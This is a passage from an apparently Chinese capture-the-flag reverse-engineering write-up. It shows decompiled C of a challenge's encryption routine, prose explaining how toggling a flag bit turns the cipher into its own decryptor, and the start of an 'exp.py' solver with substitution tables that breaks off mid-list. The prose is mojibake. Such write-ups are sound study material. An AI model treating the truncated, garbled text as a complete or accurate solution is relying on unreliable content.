  <span class="token function">sub_7FF6A29418FC</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v4<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_7FF6A29B30F0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_7FF6A2947F04</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>part_of_my_string<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span> a4_64u<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>out_put_string<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// edi</span>
  <span class="token keyword">char</span> v9<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>
  <span class="token keyword">char</span> v10<span class="token punctuation">[</span><span class="token number">216</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp+10h] BYREF</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+118h] [rbp+E8h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>Block<span class="token punctuation">;</span> <span class="token comment">// [rsp+138h] [rbp+108h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+158h] [rbp+128h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+178h] [rbp+148h]</span>
  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// [rsp+194h] [rbp+164h]</span>
  <span class="token keyword">int</span> v16<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1B4h] [rbp+184h] BYREF</span>
  <span class="token keyword">int</span> v17<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1D4h] [rbp+1A4h] BYREF</span>
  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment">// [rsp+214h] [rbp+1E4h]</span>

  v5 <span class="token operator">=</span> v9<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">190</span>i64<span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>
    v5 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">sub_7FF6A2941A7D</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_7FF6A29C4006<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v17<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v18 <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">-</span> a4_64u <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">;</span>
  v13 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v18 <span class="token operator">+</span> a4_64u<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// v13 = malloc(80)</span>
  <span class="token function">j_memcpy</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> part_of_my_string<span class="token punctuation">,</span> a4_64u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_7FF6A2941A28</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v10<span class="token punctuation">,</span> <span class="token number">1</span>i64<span class="token punctuation">,</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// creat v10 byte stream</span>
  v15 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a4_64u <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">;</span>                  <span class="token comment">// v15 = 20u</span>
  v11 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span>i64 <span class="token operator">*</span> v15<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// v11 = malloc(80)</span>
  Block <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">memcpy_version2</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>a4_64u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// create Block by v13</span>
  <span class="token function">j_enc1</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v10<span class="token punctuation">,</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>Block<span class="token punctuation">,</span> a4_64u<span class="token punctuation">,</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v11<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v16<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// enc1</span>
  <span class="token function">j_enc2</span><span class="token punctuation">(</span>v10<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v11 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v17<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// enc2</span>
  v14 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_7FF6A29412A3</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v17<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// make v14 by v11</span>
  <span class="token function">j_memcpy</span><span class="token punctuation">(</span>out_put_string<span class="token punctuation">,</span> v14<span class="token punctuation">,</span> v17<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>Block<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>v14<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> v17<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> v16<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">sub_7FF6A29418FC</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v9<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_7FF6A29A6FE0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v7<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ä¸Šé¢çš„æ³¨é‡Šå°±æ˜¯å¯¹è¿™ä¸ª enc çš„åˆ†æäº†ã€‚</p>
<p>ä»–ä¼šåˆ›å»ºä¸€å— block ä¿å­˜è¾“å…¥è¿›çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå•çœ‹è¿™ä¸ªæœ‰ç‚¹å¥‡æ€ªçš„ä»£ç å…¶å®ä¸é€‚åˆï¼ŒåŠ¨æ€è°ƒè¯•æ¯”è¾ƒæ–¹ä¾¿ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä¸Šé¢çš„å‡ ä¸ª x64_dbg è°ƒè¯•ä¸‹é¢å†…å­˜çª—å£åå­—éƒ½æ˜¯è¿™äº›å˜é‡çš„åå­—ã€‚</p>
<p>è€Œä¸”è¿˜è‡ªå·±å®ç°äº†ä¸¤ä¸ª memcpy å‡½æ•°ï¼Œæˆ‘ä¸€å¼€å§‹å·®ç‚¹çœ‹æ‡µäº†ã€‚</p>
<p>å¯ä»¥çœ‹å‡ºå‰é¢å‡ ä¸ªå‡½æ•°åŸºæœ¬éƒ½åœ¨åˆå§‹åŒ–å‚æ•°ï¼Œåœ¨ä¸‹é¢ enc1 å’Œ enc2è¿›è¡ŒåŠ å¯†ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/enc.jpg" alt="enc"></p>
<p>åœ¨ enc1 ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°<strong>çº¢è‰²æ¡†æ¡†</strong>è¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¾ˆå¥‡æ€ªï¼Œæˆ‘ä¸€å¼€å§‹æ²¡æ³¨æ„ï¼Œç›´åˆ°æˆ‘è·Ÿè¿›<strong>é»„è‰²æ¡†æ¡†</strong>æ‰å‘ç°è¿™ä¸ªå‡½æ•°æœ‰å¤šå¤æ‚ï¼Œæœç´¢åå‘ç°æœ‰ä¸€äº›æ“ä½œå’Œ AES å¾ˆåƒï¼Œä½†æ˜¯å¾ˆå¥‡æ€ªï¼ŒAES çš„ s-boxï¼Œè½®æ•°ï¼Œå…¶å®éƒ½å¯¹ä¸ä¸Šã€‚æˆ‘çœ‹è¿™ä¸ª if else å¥½åƒæœ‰ç‚¹äº’é€†çš„æ ·å­ï¼Œæˆ‘è¯•ç€æŠŠ block ä¸­çš„å­—ç¬¦ä¸²æ”¹æˆäº†è¾“å‡ºï¼Œä¿®æ”¹äº†è¿™ä¸ªæ ‡å¿—ä½ï¼Œå†è°ƒç”¨åŠ å¯†ï¼Œç»“æœå¾ˆæƒŠäººã€‚å®ƒæ¢å¤äº† â€˜aâ€™*64 å­—ç¬¦ä¸²ã€‚ä¸Šç‚¹å›¾ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/aaa_before_enc.jpg" alt="aaa_before_enc"></p>
<p>å¯è§ v10 æœ‰ä¸€ä¸ªæ ‡å¿—ä½ï¼Œç„¶ååŠ å¯† block å­—ç¬¦ä¸²ã€‚<br>ç»è¿‡ä¸¤ä¸ªåŠ å¯†ç¨‹åºåã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/aaa_after_enc.jpg" alt="aaa_after_enc"></p>
<p>æŠŠè¿™ä¸€æ®µ dump ä¸‹æ¥å½“ä½œ block è¾“å…¥ï¼Œå†æŠŠ æ ‡å¿—ä½æ”¹æˆ 0ï¼ˆæœ‰æ—¶å€™å°±è¦è¯•æ¢ä¸€ä¸‹ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/reaaa_before.jpg" alt="aaa_before_enc"></p>
<p>ç»è¿‡åŠ å¯†</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/reaaa_after.jpg" alt="aaa_after_enc"></p>
<p>ä»–å±…ç„¶å˜æˆäº† aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaâ€¦. å“ˆå“ˆå“ˆå“ˆå“ˆï¼Œé‚£ä¸€åˆ‡è¿åˆƒè€Œè§£ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#exp.py</span>
tables <span class="token operator">=</span> <span class="token punctuation">[</span>
<span class="token punctuation">[</span><span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">247</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">246</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span> <span class="token number">228</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">184</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">205</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">216</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">]</span>
<span class="token punctuation">,</span> 
<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> 